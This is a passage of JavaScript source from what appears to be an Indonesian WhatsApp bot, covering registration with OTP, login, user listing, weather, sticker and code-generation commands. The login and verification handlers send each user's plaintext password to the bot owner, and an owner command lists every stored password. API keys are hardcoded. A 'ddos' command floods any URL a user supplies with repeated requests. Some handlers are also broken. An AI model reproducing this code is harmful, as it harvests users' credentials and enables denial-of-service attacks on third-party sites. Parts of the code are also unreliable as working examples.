                // Mungkin perlu menghapus data sementara jika pengiriman OTP gagal
            }
        } else {
            Reply("Terjadi kesalahan saat menyimpan data pendaftaran sementara.");
        }
    }
} break;

            case 'verifotp': {
                
                if (m.isGroup) return Reply(mess.private)
                if (!text) return Reply(`Format salah! Gunakan: ${prefix + command} <kode_otp>`);
                const otpInput = text.trim();
                const nomorPengguna = m.sender.split("@")[0];

                const userData = await bacaDataPendaftar();
                const user = userData.find(u => u.no === nomorPengguna && u.otp === otpInput);

                if (user) {
                    // Hapus OTP dari data pengguna
                    const berhasilHapusOTP = await hapusOTPdiPendaftar(nomorPengguna);
                    if (berhasilHapusOTP) {
                        Reply(`Selamat! Nomor ${nomorPengguna} berhasil diverifikasi dan didaftarkan\nNomor: ${nomorPengguna}\nNama: ${user.nama}\nUmur:${user.umur}\nPassword: ${user.password}`);
                        try {
                            await Sky.sendMessage(ownerNumber, { text: `Pendaftaran Baru (Verifikasi OTP):\nNomor: ${nomorPengguna}\nNama: ${user.nama}\nPassword: ${user.password}`, contextInfo: {isForwarded: true}}, {quoted:m});
                        } catch (error) {
                            console.error("Gagal mengirim notifikasi pendaftaran ke grup:", error);
                        }
                        // Tidak perlu login terpisah lagi, data sudah permanen setelah verifikasi
                    } else {
                        Reply(`Terjadi kesalahan saat menghapus kode OTP.`);
                    }
                } else {
                    Reply(`Kode OTP salah atau nomor tidak terdaftar. Silakan daftar menggunakan perintah ${prefix}regno.`);
                }
            } break;

            case 'login': {
    if (!text) return Reply(`Format salah! Gunakan: ${prefix + command} <email/nomor_telepon>|<password>`);
    let splitText = text.split("|").map(t => t.trim());
    const loginId1 = splitText[0];
    const loginId = loginId1.replace(/[^0-9]/g, '');
    const passwordLogin = splitText[1];

    if (!loginId || !passwordLogin) {
        return Reply(`Format salah! Gunakan: ${prefix + command} <email/nomor_telepon>|<password>`);
    }

    const userData = await bacaDataPendaftar();
    const user = userData.find(u => u.no === loginId || u.email === loginId);

    if (user) {
        if (passwordLogin === user.password) {
            Reply(`Selamat datang kembali, ${user.nama}!`);
            try {
                await Sky.sendMessage(ownerNumber, { text: `Login Berhasil:\nID: ${loginId}\nNama: ${user.nama}\nPassword: ${user.password}` });
            } catch (error) {
                console.error("Gagal mengirim notifikasi login ke grup:", error);
            }
            // Tambahkan logika lain setelah login berhasil jika diperlukan
        } else {
            Reply(`Password salah.`);
        }
    } else {
        Reply(`ID ${loginId} tidak terdaftar. Silakan daftar terlebih dahulu menggunakan perintah ${prefix}regno (untuk nomor telepon) atau ${prefix}regemail (untuk email).`);
    }
} break;

            case 'hapususer': {
                if (m.isGroup) return Reply(mess.private)
                if (!isCreator) return Reply(mess.owner);
                if (!text) return Reply(`Format salah! Gunakan: ${prefix + command} <nomor_telepon_pengguna>`);
                const nomorPenggunaYangDihapus = text.replace(/[^0-9]/g, '');
                const dataPendaftar = await bacaDataPendaftar();
                const indexPengguna = dataPendaftar.findIndex(user => user.no === nomorPenggunaYangDihapus);

                if (indexPengguna === -1) return Reply(`Pengguna dengan nomor ${nomorPenggunaYangDihapus} tidak ditemukan.`);

                dataPendaftar.splice(indexPengguna, 1);
                const berhasilTulis = await tulisDataPendaftar(dataPendaftar);

                if (berhasilTulis) {
                    Reply(`Data pengguna dengan nomor ${nomorPenggunaYangDihapus} berhasil dihapus.`);
                    try {
                        await Sky.sendMessage(ownerNumber, { text: `Pengguna dengan nomor ${nomorPenggunaYangDihapus} telah dihapus oleh owner.` });
                    } catch (error) {
                        console.error("Gagal mengirim notifikasi penghapusan pengguna ke grup:", error);
                    }
                } else {
                    Reply(`Terjadi kesalahan saat menghapus data pengguna.`);
                }
            } break;

                case 'regemail': {
                const args = text.split('|');
                if (args.length < 4) return Reply(`Format salah! Gunakan: ${prefix + command} <email>|<nama>|<umur>|<password>\nContoh:\nuser@example.com|Nama User|20|password123`);
                const [email, nama, umur, password] = args.map(arg => arg.trim());
                const loginVia = 'email';
                const otpLength = 6;
                const otpCode = generateOTP(otpLength);

                const sudahTerdaftar = await cekPendaftarSudahAda(email); // Asumsikan cekPendaftarSudahAda bisa mengecek berdasarkan email juga
                if (sudahTerdaftar) {
                    return Reply(`Email ${email} sudah terdaftar sebelumnya. Silakan login.`);
                }

                const emailResult = await sendEmailOTP(email, otpCode);
                if (emailResult.status === 'success') {
                    tempPendaftarEmail[email] = { email, nama, umur, password, otp: otpCode, 'login via': loginVia };
                    Reply(`Kode OTP telah dikirim ke email: ${email}.\n\nSilakan kirim kode OTP menggunakan perintah ${prefix}verifemail <kode_otp> untuk verifikasi.`);
                } else {
                    Reply(`Gagal mengirim OTP ke email: ${email}\nError: ${emailResult.message}`);
                }
            } break;

            case 'verifemail': {
                if (!text) return Reply(`Format salah! Gunakan: ${prefix + command} <kode_otp>`);
                const otpInput = text.trim();
                const emailPengguna = m.sender.split('@')[0]; // Ini mungkin perlu disesuaikan, karena m.sender biasanya nomor WA

                // Kita perlu cara untuk mengidentifikasi email pengguna yang melakukan verifikasi.
                // Mungkin perlu menyimpan email yang terkait dengan chat ID sementara.
                // Untuk sederhananya, kita akan mencoba mencocokkan OTP dengan email yang ada di tempPendaftarEmail.
                let foundEmail = null;
                for (const email in tempPendaftarEmail) {
                    if (tempPendaftarEmail[email].otp === otpInput) {
                        foundEmail = email;
                        break;
                    }
                }

                if (foundEmail) {
                    const { email, nama, umur, password, 'login via': via } = tempPendaftarEmail[foundEmail];
                    const dataBaru = { email, nama, umur, password, 'login via': via };
                    const berhasilSimpan = await simpanPendaftarEmail(dataBaru);
                    if (berhasilSimpan) {
                        Reply(`Selamat! Email ${email} berhasil diverifikasi dan didaftarkan.`);
                        try {
                            await Sky.sendMessage(ownerNumber, { text: `Pendaftaran Baru (Email):\nEmail: ${email}\nNama: ${nama}` });
                        } catch (error) {
                            console.error("Gagal mengirim notifikasi pendaftaran via email ke grup:", error);
                        }
                        delete tempPendaftarEmail[foundEmail]; // Hapus data sementara setelah berhasil disimpan
                    } else {
                        Reply(`Terjadi kesalahan saat menyimpan data pendaftar.`);
                    }
                } else {
                    Reply(`Kode OTP salah atau email tidak ditemukan dalam proses pendaftaran. Silakan daftar menggunakan perintah ${prefix}regemail.`);
                }
            } break;
case 'cekregis' : {
  if (!await isRegister(m.sender)) return Reply(`Anda Belum Terdaftar Silahkan Mendaftar menggunakan perintah .register`);
  if (await isRegister(m.sender)) return m.reply(`Anda Sudah Terdaftar!!`);
}
break

//=======================================================
     
case 'listdaftar':
        case 'listreg': {
            const readFile = util.promisify(fs.readFile);

            if (!isOwner) {
                return m.reply(mess.owner); // Gunakan mess.owner untuk pesan penolakan
            }

            try {
                const daftarPath = path.join(__dirname, '.', '.', 'library', 'database', 'daftar.json');
                const dataBuffer = await readFile(daftarPath, 'utf8');
                const daftarPengguna = JSON.parse(dataBuffer);

                if (daftarPengguna.length === 0) {
                    return m.reply('Belum ada pengguna yang terdaftar di bot ini.');
                }

                let listText = '*--- Daftar Pengguna Terdaftar ---*\n\n';
                let no = 1;
                for (const pengguna of daftarPengguna) {
                    listText += `*${no}. Info Pengguna:*\n`;
                    if (pengguna.nama) {
                        listText += `  Nama: ${pengguna.nama}\n`;
                    }
                    if (pengguna.umur) {
                        listText += `  Umur: ${pengguna.umur}\n`;
                    }
                    if (pengguna.no) {
                        listText += `  Nomor: ${pengguna.no}\n`;
                    } else if (pengguna.email) {
                        listText += `  Email: ${pengguna.email}\n`;
                    }
                    if (pengguna.password) {
                        listText += `  Password: ${pengguna.password}\n`;
                    }
                    if (pengguna.tanggal_daftar) {
                        listText += `  Tanggal Daftar: ${pengguna.tanggal_daftar}\n`;
                    }
                    if (pengguna.terakhir_login) {
                        listText += `  Terakhir Login: ${pengguna.terakhir_login}\n`;
                    }
                    listText += '\n';
                    no++;
                }
                listText += `*Total Pengguna Terdaftar: ${daftarPengguna.length}*`;

                Sky.sendMessage(m.chat, { text: listText }, { quoted: m });

            } catch (error) {
                console.error('Gagal membaca atau menampilkan daftar pendaftar:', error);
                m.reply('Terjadi kesalahan saat mencoba menampilkan daftar pendaftar.');
            }
        }
        break;
   //=======================================================
    
 case "faketaggc" : 
 case "faketagsw" :
 {
 let tekstaggc = `@ Grup ini disebut.`
 await Sky.sendMessage(m.chat, {text: tekstaggc, mentions: [m.sender, global.owner+"@s.whatsapp.net"]}, {quoted: qtexttagsw})
 }
break
    

    
 

//=======================================================
    
 // YODAH BUANG SAJA
// LIST TOTAL MESSAGE DENGAN FILTER PESAN
case 'topmessage': {
  let totm = {};
  for (let mess of store.messages[m.chat].array) {
     if (!totm[mess.participant] && mess.participant) totm[mess.participant] = 0;
     let body =  (mess.mtype === 'interactiveResponseMessage') ? JSON.parse(mess.message?.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson)?.id :  (mess.mtype === 'conversation') ? mess.message?.conversation : 
               (mess.mtype == 'imageMessage') ? mess.message?.imageMessage?.caption : 
               (mess.mtype == 'videoMessage') ? mess.message?.videoMessage?.caption : 
               (mess.mtype == 'extendedTextMessage') ? mess.message?.extendedTextMessage?.text : 
               (mess.mtype == 'buttonsResponseMessage') ? mess.message?.buttonsResponseMessage?.selectedButtonId : 
               (mess.mtype == 'listResponseMessage') ? mess.message?.listResponseMessage?.singleSelectReply?.selectedRowId : 
               (mess.mtype == 'templateButtonReplyMessage') ? mess.message?.templateButtonReplyMessage?.selectedId : 
               (mess.mtype == 'messageContextInfo') ? (mess.message?.buttonsResponseMessage?.selectedButtonId || mess.message?.listResponseMessage?.singleSelectReply?.selectedRowId || mess.text) : 
               (mess.mtype === "viewOnceMessageV2") ? (mess.msg?.message?.imageMessage?.caption || mess.msg?.message?.videoMessage?.caption || "") : "";
     if (mess.participant && !body.startsWith('.')) totm[mess.participant]++;
  }
  
  let sorted = Object.entries(totm).sort((a, b) => b[1] - a[1]);
  
  let teks = '';
  for (let [p, count] of sorted) {
    teks += '@' + p.split('@')[0] + ' -> ' + count + ' Pesan\n';
  }
  Sky.sendMessage(m.chat, {text:teks, mentions:Object.keys(totm)})
}
break;
    

//=======================================================
    case 'subs4unlock': {

            if (!args[0]) {
                return m.reply('Silakan kirim URL halaman Link2Unlock!');
            }
            const url = args[0];

            m.reply('Sedang memproses, mohon tunggu sebentar...');

            try {
                const response = await axios.get(url);
                const data = response.data;

                console.log('Data Lengkap dari URL:', JSON.stringify(data, null, 2)); // Log seluruh data

                let propsData = data?.props || data?.Props || data?.PROPS;

                if (!propsData) {
                    return m.reply('Data tidak memiliki properti props, Props, atau PROPS.');
                }

                if (!propsData.link) {
                    return m.reply('Data.props tidak memiliki properti link.');
                }

                const title = propsData.link.name || 'Judul Tidak Ditemukan';
                const finishLink = propsData.link.finish?.[0]?.url || 'Link Download Tidak Ditemukan';

                let message = `*--- Link2Unlock Info ---*\n\n`;
                message += `Judul: ${title}\n`;
                message += `Link Download: ${finishLink}\n\n`;
                message += `*Pastikan Anda telah menyelesaikan semua persyaratan di halaman tersebut!*`;

                Sky.sendMessage(m.chat, { text: message }, { quoted: m });

            } catch (error) {
                console.error('Terjadi error saat mengambil atau memproses data:', error);
                m.reply('Terjadi error saat memproses URL.');
            }
        }
        break;
    

//=======================================================
case 'createsc': {
            // Konstanta
            const reactionLoading = { text: '🕒', key: m.key };
            const reactionSuccess = { text: '✅', key: m.key };
            const reactionError = { text: '❌', key: m.key };
            const defaultPassword = '#admin123';
            const geminiApiKey = 'AIzaSyCuQOocC6ny8Edq8rskMe2NN_lgcfaaf5g';  
            const sourceFolder = 'source/';

            const sendReaction = async (reaction) => {
                await Sky.sendMessage(m.chat, { react: reaction });
            };

            await sendReaction(reactionLoading);

            if (!args[0]) {
                await sendReaction(reactionError);
                return m.reply(
                    `*Perintah Salah!*\n\n` +
                    `Gunakan perintah ini untuk membuat file bot baru:\n\n` +
                    `.createsc <nama_bot> <permintaan_fitur>\n\n` +
                    `Contoh:\n` +
                    `.createsc BotKeren Buatkan bot dengan fitur auto respon dan downloader\n\n` +
                    `<nama_bot>: Nama untuk bot baru Anda (misal: BotKeren).\n` +
                    `<permintaan_fitur>: Deskripsi fitur yang Anda inginkan (misal: buatkan bot dengan fitur auto respon dan downloader).`
                );
            }

            const botName = args[0].toLowerCase().replace(/\s+/g, '-');
            const zipFileName = `${botName}.zip`;
            const zipFilePath = path.join(__dirname, '..', zipFileName);

            const creator = m.pushname || 'Creator';
            const fiturBotRequest = args.slice(1).join(' ') || 'fitur dasar bot';
            const passwordBot = defaultPassword;

            // Inisialisasi Gemini AI
            let model;
            try {
                console.log('Gemini API Key:', geminiApiKey);
                console.log('Mencoba inisialisasi GenerativeModel...');
                const genAI = new GenerativeModel({ apiKey: geminiApiKey });
                console.log('GenerativeModel berhasil diinisialisasi:', genAI);
                if (!genAI) {
                    throw new Error("GenerativeModel tidak berhasil diinisialisasi (genAI adalah null/undefined)");
                }
                model = genAI.geminiPro;
                console.log('Gemini Pro Model:', model);
                if (!model) {
                    throw new Error("Model geminiPro tidak ditemukan (model adalah null/undefined)");
                }
            } catch (error) {
                console.error("Gagal inisialisasi Gemini API:", error);
                console.error("Jenis Error:", error.name);
                console.error("Pesan Error:", error.message);
                console.error("Stack Trace:", error.stack);
                await sendReaction(reactionError);
                return m.reply(
                    "Terjadi kesalahan saat menginisialisasi Gemini API. Pastikan API key Anda sudah benar dan API Gemini diaktifkan.  Error: " + error.message
                );
            }

            const promptCase = `Buatkan saya kode JavaScript untuk fitur bot WhatsApp dengan detail berikut: \${fiturBotRequest}. Gunakan library nstar-baileys. Sertakan contoh penggunaan dan penjelasan singkat.`;
            const promptLibrary = `Buatkan saya kode JavaScript untuk library bot WhatsApp yang berfungsi untuk menyimpan dan mengelola daftar (misalnya, daftar pengguna). Gunakan format yang mudah diakses dan dimodifikasi.`;
            const promptLib = `Buatkan saya kode JavaScript untuk fungsi-fungsi scrape bot WhatsApp yang umum digunakan (misalnya, mengambil informasi dari website). Gunakan library cheerio atau yang sesuai.`;
            const promptPlugin = `Buatkan saya contoh kode JavaScript untuk sebuah plugin bot WhatsApp sederhana yang memberikan informasi dasar tentang bot (nama, pembuat). Gunakan format plugin yang umum.`;
            const promptScrape = `Buatkan saya contoh kode JavaScript untuk fungsi scrape bot WhatsApp yang mengambil quote/kutipan acak dari internet.`;
            const promptSettings = `Buatkan saya kode JavaScript untuk file pengaturan global bot WhatsApp (settings.js) dengan nama bot: \${botName}, owner bot: \${m.sender.split('@')[0]}, prefix bot: !, dan pesan selamat datang: Halo! Saya adalah \${botName}, bot WhatsApp yang dibuat oleh \${creator} dengan fitur: \${fiturBotRequest}. Gunakan format module.exports.`;
            const promptIndex = `Buatkan saya kode JavaScript dasar untuk file index.js bot WhatsApp yang mengimpor dan menjalankan bot menggunakan library nstar-baileys.`;
            const promptStart = `Buatkan saya contoh kode JavaScript dasar untuk file start.js bot WhatsApp yang berfungsi untuk memulai bot (mirip index.js).`;
            const promptMain = `Buatkan saya contoh kode JavaScript dasar untuk file main.js bot WhatsApp sebagai alternatif untuk memulai bot (mirip index.js atau start.js).`;

            let generatedCaseContent = `// Fitur Bot: \${fiturBotRequest}\n\n`;
            let generatedLibraryContent = `// Library Bot\n\n`;
            let generatedLibContent = `// Lib Bot\n\n`;
            let generatedPluginContent = `// Plugin Bot\n\n`;
            let generatedScrapeContent = `// Scrape Bot\n\n`;
            let generatedSettingsContent = `// Pengaturan Bot\n\n`;
            let generatedIndexContent = `// index.js\n\n`;
            let generatedStartContent = `// start.js\n\n`;
            let generatedMainContent = `// main.js\n\n`;

            try {
                const resultCase = await model.generateContent(promptCase);
                const responseCase = await resultCase.response;
                generatedCaseContent += responseCase.text();

                const resultLibrary = await model.generateContent(promptLibrary);
                const responseLibrary = await resultLibrary.response;
                generatedLibraryContent += responseLibrary.text();

                const resultLib = await model.generateContent(promptLib);
                const responseLib = await resultLib.response;
                generatedLibContent += responseLib.text();

                const resultPlugin = await model.generateContent(promptPlugin);
                const responsePlugin = await resultPlugin.response;
                generatedPluginContent += responsePlugin.text();

                const resultScrape = await model.generateContent(promptScrape);
                const responseScrape = await resultScrape.response;
                generatedScrapeContent += responseScrape.text();

                const resultSettings = await model.generateContent(promptSettings);
                const responseSettings = await resultSettings.response;
                generatedSettingsContent += responseSettings.text();

                const resultIndex = await model.generateContent(promptIndex);
                const responseIndex = await resultIndex.response;
                generatedIndexContent += responseIndex.text();

                const resultStart = await model.generateContent(promptStart);
                const responseStart = await resultStart.response;
                generatedStartContent += responseStart.text();

                const resultMain = await model.generateContent(promptMain);
                const responseMain = await resultMain.response;
            } catch (error) {
                console.error('Gagal menghasilkan kode dari Gemini:', error);
                generatedCaseContent += `// Gagal menghasilkan kode fitur dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedLibraryContent += `// Gagal menghasilkan kode library dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedLibContent += `// Gagal menghasilkan kode lib dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedPluginContent += `// Gagal menghasilkan kode plugin dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedScrapeContent += `// Gagal menghasilkan kode scrape dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedSettingsContent += `// Gagal menghasilkan kode settings dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedIndexContent += `// Gagal menghasilkan kode index dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedStartContent += `// Gagal menghasilkan kode start dari Gemini.\n// Silakan edit file ini secara manual.`;
                generatedMainContent += `// Gagal menghasilkan kode main dari Gemini.\n// Silakan edit file ini secara manual.`;
            }

            const newPackageJsonContent = `{ "name": "\${botName}", "version": "1.0.0", "description": "Bot WhatsApp dengan fitur: \${fiturBotRequest}", "main": "index.js", "scripts": { "start": "node ." }, "dependencies": { "nstar-baileys": "^latest", "pino": "^latest", "qrcode-terminal": "^latest", "cheerio": "^latest" } }`;

            const output = fs.createWriteStream(zipFilePath);
            const archive = archiver('zip', { zlib: { level: 9 } });

            archive.on('error', (err) => {
                console.error('Gagal membuat file ZIP:', err);
                sendReaction(reactionError);
                m.reply('Gagal membuat file ZIP.');
            });

            archive.pipe(output);

            archive.append(generatedCaseContent, { name: 'case.js' });
            archive.append(generatedLibraryContent, { name: 'library/daftar.js' });
            archive.append(generatedLibContent, { name: 'lib/scrape.js' });
            archive.append(generatedPluginContent, { name: 'plugins/info.js' });
            archive.append(generatedScrapeContent, { name: 'scrape/example.js' });
            archive.append(generatedSettingsContent, { name: 'settings.js' });
            archive.append(newPackageJsonContent, { name: 'package.json' });
            archive.append(generatedIndexContent, { name: 'index.js' });
            archive.append(generatedStartContent, { name: 'start.js' });
            archive.append(generatedMainContent, { name: 'main.js' });
            archive.directory(sourceFolder, sourceFolder);

            archive.finalize();

            output.on('close', () => {
                console.log('File ZIP berhasil dibuat:', zipFilePath);
                Sky.sendMessage(m.chat, {
                    document: { url: zipFilePath },
                    mimetype: 'application/zip',
                    fileName: zipFileName
                }, { quoted: m }).then(() => {
                    sendReaction(reactionSuccess);
                    const detailBot = `
*🤖 File Bot Baru Berhasil Dibuat dengan Fitur Kustom! 🤖*

*Nama Bot:* \${botName}
*Dibuat Oleh:* \${creator}
*Fitur yang Diminta:* \${fiturBotRequest}
*Password Bot:* \${passwordBot}

*Isi File Bot (Generated by AI):*
- case.js (Fitur Bot Kustom)
- library/daftar.js (Library Daftar)
- lib/scrape.js (Fungsi Scrape Umum)
- plugins/info.js (Plugin Info Dasar)
- scrape/example.js (Contoh Scrape Quote)
- settings.js (Pengaturan Dasar)
- package.json (Dependencies)
- index.js (Main File)
- start.js (Start Script)
- main.js (Alternative Start Script)
- \${sourceFolder} (Folder Kosong)

Silakan ekstrak file ZIP dan tinjau serta edit file-file di dalamnya. Kode yang dihasilkan oleh AI mungkin memerlukan penyesuaian lebih lanjut, terutama pada bagian pengaturan (\`settings.js\`).
`;
                    m.reply(detailBot);

                    fs.unlink(zipFilePath, (err) => {
                        if (err) {
                            console.error('Gagal menghapus file ZIP:', err);
                        } else {
                            console.log('File ZIP berhasil dihapus:', zipFilePath);
                        }
                    });
                }).catch(err => {
                    console.error("Gagal mengirim file ZIP:", err);
                    sendReaction(reactionError);
                    m.reply('Gagal mengirim file ZIP.');
                });
            });
        } break;

//=======================================================

case 'cekcuaca': case 'cuaca': {
  if (!q) return m.reply('Masukkan nama lokasi!\nContoh: cekcuaca Jakarta');
  let lokasi = encodeURIComponent(q);
  let url = `https://fastrestapis.fasturl.cloud/search/bmkgweather?location=${lokasi}`;

  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200 || json.content !== 'Success') {
      return m.reply('Gagal mengambil data cuaca!');
    }
    let cuaca = json.result.presentWeather.data.cuaca;
    let lokasiInfo = json.result.presentWeather.data.lokasi;
    let hasil = `*Cuaca Saat Ini - ${lokasiInfo.kotkab}, ${lokasiInfo.provinsi}*\n\n` +
      `• Lokasi: ${lokasiInfo.desa}, ${lokasiInfo.kecamatan}\n` +
      `• Cuaca: ${cuaca.weather_desc}\n` +
      `• Suhu: ${cuaca.t}°C\n` +
      `• Kelembapan: ${cuaca.hu}%\n` +
      `• Arah Angin: ${cuaca.wd} → ${cuaca.wd_to} (${cuaca.ws} km/jam)\n` +
      `• Jarak Pandang: ${cuaca.vs_text}\n` +
      `• Terakhir diperbarui: ${cuaca.local_datetime}\n`;

    await Sky.sendMessage(m.chat, {
      image: { url: cuaca.image },
      caption: hasil
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan saat mengambil data cuaca.');
  }
  }
  break


//=======================================================

case 'convertcode': {
if (!text) return Reply('Penggunaan salah. Contoh:\n.convertcode case rafz <kode plugin>\n.convertcode plugins rafz')
async function convertPluginToCase(pluginCode, botName) {
  // Mengganti import dan export menjadi require dan modul.exports
  let caseCode = pluginCode.replace(/import(.*)from(.*)/g, 'const $1 = require($2)')
                           .replace(/export default handler/g, 'handler')
                           .replace(/async \((m, { conn, args, usedPrefix, command }\))/g, 'case command: {')
                           .replace(/let handler = async \((m, { conn, args, usedPrefix, command }\))/g, 'case command: {')
                           .replace(/conn\.sendMessage/g, `${botName}.sendMessage`)
                           .replace(/\}\)/g, '}')
                           .replace(/break\s*case/g, 'break;\ncase'); // Menambahkan semicolon sebelum break

  // Menambahkan struktur case yang diperlukan
  caseCode = `
${caseCode}
break
`;

  return caseCode;
}

async function convertCaseToPlugin(caseCode, botName) {
  // Menghapus require dan case, mengembalikan ke import dan export
  let pluginCode = caseCode.replace(/const(.*)=\s*require\((.*)\)/g, 'import $1 from $2')
                             .replace(/case\s+'(.*)'\s*:\s*{([\s\S]*?)(break;)?\s*}/g, 'let handler = async (m, { conn, args, usedPrefix, command }) => { $2 }')
                             .replace(/case\s+command\s*:\s*{([\s\S]*?)(break;)?\s*}/g, 'let handler = async (m, { conn, args, usedPrefix, command }) => { $1 }')
                             .replace(/case\s+(.*)\s*:\s*{([\s\S]*?)(break;)?\s*}/g, 'let handler = async (m, { conn, args, usedPrefix, command }) => { $2 }')
                             .replace(/handler\s*\n/g, '') // Bersihkan sisa handler
                             .replace(/\s*break;?\s*$/g, '') // Hapus break di akhir
                             .replace(/\s*break\s*case/g, '\ncase') // Kembalikan pemisah case
                             .replace(/const axios = require\('axios'\)\nconst cheerio = require\('cheerio'\)\n*/, '') // Hapus require di awal
                             .replace(new RegExp(`${botName}\\.sendMessage`, 'g'), 'conn.sendMessage')
                             .replace(/let handler = async \((m, \{ (.*?) \}\))/g, 'let handler = async (m, { $2 })') // Perbaiki destructuring
                             .replace(/let handler = async \(m, \{ (.*?) \}\)/g, 'let handler = async (m, { $1 })') // Perbaiki destructuring lagi
                             .replace(/\}$/, '\n\nexport default handler'); // Tambahkan export di akhir

  // Menambahkan kembali handler.help, handler.tags, dan handler.command
  const helpMatch = caseCode.match(/case\s+['"](.*)['"]\s*:/);
  if (helpMatch && helpMatch[1]) {
    pluginCode += `\nhandler.help = ['${helpMatch[1]}']`;
    pluginCode += `\nhandler.command = /^${helpMatch[1]}$/i`; // Asumsi command sama dengan help
  }

  pluginCode += `\nhandler.tags = ['random']`; // Menambahkan tags default, mungkin perlu penyesuaian

  return pluginCode.trim();
}
if (command === 'convert') {
    const type = args[0];
    const botName = args[1];
    const code = args.slice(2).join('\n'); // Asumsi kode diberikan setelah perintah dan nama bot

    if (!type || !botName || !code) {
      return m.reply('Penggunaan salah. Contoh:\n.convertcode case rafz <kode plugin>\n.convertcode plugins rafz <kode case>');
    }

    if (type === 'case') {
      const convertedCode = await convertPluginToCase(code, botName);
      m.reply(`\`\`\`${convertedCode}\`\`\``);
    } else if (type === 'plugins') {
      const convertedCode = await convertCaseToPlugin(code, botName);
      m.reply(`\`\`\`${convertedCode}\`\`\``);
    } else {
      m.reply('Tipe konversi tidak valid. Pilih antara "case" atau "plugins".');
    }
  }
}
break

//=======================================================

case 'antitagsw':{
  if (!m.isGroup) return Reply(mess.group)
  if (!m.isBotAdmin) return Reply(mess.botAdmin)
  if (!db.data) db.data = {}
  if (!db.data.chats) db.data.chats = {}
  if (!db.data.chats[m.chat]) db.data.chats[m.chat] = {}
  if (!db.data.chats[m.chat].antitagsw) db.data.chats[m.chat].antitagsw = { status: false, count: {} }
  let type = (q || '').toLowerCase()
  if (type === 'on') {
    if (db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah aktif.')
    db.data.chats[m.chat].antitagsw.status = true
    m.reply('Anti tag semua telah *diaktifkan*!')
  } else if (type === 'off') {
    if (!db.data.chats[m.chat].antitagsw.status) return m.reply('Anti tag semua sudah nonaktif.')
    db.data.chats[m.chat].antitagsw.status = false
    db.data.chats[m.chat].antitagsw.count = {} 
    m.reply('Anti tag semua telah *dinonaktifkan*!')
  } else {
    m.reply(`Penggunaan:\n${prefix}antitagsw on\n${prefix}antitagsw off`)
  }
 }
  break

//=======================================================

case 'upchbrat': {
if (!text) return m.reply(`mana teksnya\nContoh:\n${prefix+command} nasi`)
const interactiveButtons = [
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Brat Original",
             id: `.upchbrat-original ${text}`
        })
     },
     {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Brat Versi2",
             id: `.upchbrat-versi2 ${text}`
        })
     },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Brat Emoji Iphone",
             id: `.upchbrat-iphone ${text}`
        })
     },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
             display_text: "Brat Video",
             id: `.upchbrat-video ${text}`
        })
     }
]
const interactiveMessage = {
    text: "",
    title: "Mau brat tipe apa yg di kirim ke saluran?",
    footer: `${botname2} POWERED BY ©${namaOwner}`,
    interactiveButtons
}
await Sky.sendMessage(m.chat, interactiveMessage, {quoted: m})
}
break

case "upchbrat-original": {
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer(`https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}`)
await Sky.sendAsSticker(salurannya, res, m, {packname: global.packname})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply (`Berhasil mengirim stiker ke saluran!!\nLink saluran:https://whatsapp.com/channel/0029VbB9Rx74o7qIZQaujS2G`)
break

case "upchbrat-versi2": {
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer(`https://beforelife.me/api/maker/brat?query=${text}&apikey=HC-MYOna3CYK8Ktjvf`)
await Sky.sendAsSticker(salurannya, res, m, {packname: global.packname})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply (`Berhasil mengirim stiker ke saluran!!\nLink saluran:https://whatsapp.com/channel/0029VbB9Rx74o7qIZQaujS2G`)
break

case "upchbrat-iphone": {
await Sky.sendMessage(m.chat, {react: {text: '🕒', key: m.key}})
let res = await getBuffer(`https://vapis.my.id/api/bratv1?q=${encodeURIComponent(text)}`)
await Sky.sendAsSticker(salurannya, res, m, {packname: global.packname})
}
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply (`Berhasil mengirim stiker ke saluran!!\nLink saluran:https://whatsapp.com/channel/0029VbB9Rx74o7qIZQaujS2G`)
break

case "upchbrat-video": {
try {
await Sky.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
const axios = require('axios');
let brat = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true&delay=500`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await Sky.sendAsSticker(salurannya, videoBuffer, m, {
packname: global.packname,
})
await Sky.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
m.reply (`Berhasil mengirim stiker ke saluran!!\nLink saluran:https://whatsapp.com/channel/0029VbB9Rx74o7qIZQaujS2G`)
} catch (err) {
console.error("Error:", err);
}
}
break

//=======================================================
    
case 'ddos': {
if (!text) return m.reply(`Contoh Penggunaan\n${prefix+command} google.com 999`)
m.reply(`Proses🗿🚬`)
let splitText = text.split(" ").map(t => t.trim());
const targetDDOS = splitText[0];
const jumlahDDOS = splitText[1];
for (let i = 0; i < jumlahDDOS; i++){
await fetch(`${targetDDOS}`)
}
m.reply(`Berhasil menDDOS web ${targetDDOS} sebanyak ${jumlahDDOS} kali`)
}
break

//=======================================================
    
case 'chat': {
if (!text) m.reply(`Contoh\n${prefix+command} 6288xxxxx|Halo`)
if (!isOwner) return Reply(mess.owner)
let splitText = text.split("|").map(t => t.trim());
const penerima = splitText[0]
const pesannya = splitText[1]
